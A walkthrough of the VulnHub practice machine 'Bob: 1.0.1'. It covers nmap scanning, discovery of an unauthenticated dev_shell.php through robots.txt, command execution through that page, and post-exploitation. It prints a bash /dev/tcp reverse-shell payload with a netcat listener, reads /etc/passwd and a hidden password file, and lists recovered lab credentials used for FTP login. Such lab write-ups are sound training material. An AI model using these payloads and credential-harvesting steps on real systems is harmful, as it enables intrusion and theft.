# Bob: 1.0.1

- **Machine:** Bob: 1.0.1
- **Download:** https://www.vulnhub.com/entry/bob-101,226/

![](images/680-1.png)

---

## Setup

- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.31.0/24
```

![](images/680-2.png)

---

## Full Port Scan

```bash
nmap -v -p- 192.168.31.228
```

![](images/680-3.png)

---

## Service & Version Detection

```bash
nmap -sC -sV -A 192.168.31.228
```

![](images/680-4.png)

---

## HTTP Enumeration

Visit the target in a web browser:

- http://192.168.31.228/

Run an aggressive Nmap scan with the `http-enum` NSE script to discover hidden web resources.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.31.228
```

![](images/680-5.png)

---

# Web Enumeration

## Interesting URLs

The following endpoints were discovered during enumeration:

- http://192.168.31.228/robots.txt

![](images/680-6.png)

- http://192.168.31.228/login.html

![](images/680-7.png)

- http://192.168.31.228/passwords.html
- http://192.168.31.228/dev_shell.php
- http://192.168.31.228/lat_memo.html

---

## Robots.txt Analysis

The `robots.txt` file reveals an interesting endpoint.

```text
/dev_shell.php
```

![](images/680-8.png)

Open the page in a browser:

```text
http://192.168.31.228/dev_shell.php
```

![](images/680-9.png)

---

## Command Execution Test

Execute a simple command to verify whether the page allows operating system command execution.

```bash
id
```

![](images/680-10.png)

Check the network configuration.

```bash
ip a
```

![](images/680-11.png)

The successful output confirms that arbitrary commands can be executed on the target.

---

# Reverse Shell (Lab)

> **Lab note:** The following steps are intended only for an authorized practice machine such as this VulnHub VM.

## Start a Listener

```bash
nc -lvnp 4444
```

---

## Trigger Reverse Shell

Execute the following payload through the `dev_shell.php` input field.

```bash
bash -c 'bash -i >& /dev/tcp/192.168.31.206/4444 0>&1'
```

![](images/680-12.png)

A reverse shell is received on the listener.

![](images/680-13.png)

---

# Post-Exploitation Enumeration

## Enumerate Local Users

Display the local user accounts.

```bash
cat /etc/passwd
```

![](images/680-14.png)

Three local users are identified.

---

## Enumerate User Home Directories

```bash
ls -la /home/jc
```

```bash
ls -la /home/seb
```

```bash
ls -la /home/bob
```

![](images/680-15.png)

An interesting password file is discovered.

---

## Read the Password File

```bash
cat /home/bob/.old_passwordfile.html
```

![](images/680-16.png)

### Credentials Discovered

```text
jc  : Qwerty
seb : T1tanium_Pa$$word_Hack3rs_Fear_M3
```

---

# FTP Access

Connect to the FTP service.

```bash
ftp 192.168.31.228
```

Login using the discovered credentials.

![](images/680-17.png)

Successful FTP login as **seb**.

![](images/680-18.png)

Successful FTP login as **jc**.

---

# Vulnerability Analysis

## Vulnerability Type

- Remote Command Execution (RCE)

---

## Vulnerable Component

```text
/dev_shell.php
```

---

## Description

The `dev_shell.php` page exposes a developer command shell that allows operating system commands to be executed directly through the web interface. Since the functionality is accessible without authentication or proper input validation, an attacker can execute arbitrary commands on the server.

---

# Impact

- Remote command execution.
- Obtain a reverse shell.
- Read sensitive files.
- Access credentials stored on the system.
- Authenticate to additional services such as FTP.
- Potential privilege escalation.
- Complete compromise of the target machine.

---

# Severity

- **Critical**
- **Category:** Remote Command Execution (RCE)

---

# Key Learning

- Always inspect the `robots.txt` file during web enumeration.
- Hidden developer pages may expose dangerous functionality.
- Unauthenticated command execution can quickly lead to full system compromise.
- Post-exploitation enumeration often reveals reusable credentials.
- Credentials recovered from one service may provide access to other services such as FTP.

---

# Summary

During web enumeration, the `robots.txt` file exposed a hidden developer shell (`dev_shell.php`). The page allowed unauthenticated operating system command execution, enabling a reverse shell on the target. After gaining initial access, local enumeration revealed additional user accounts and a password file containing valid FTP credentials, demonstrating how exposed administrative functionality can lead to complete system compromise.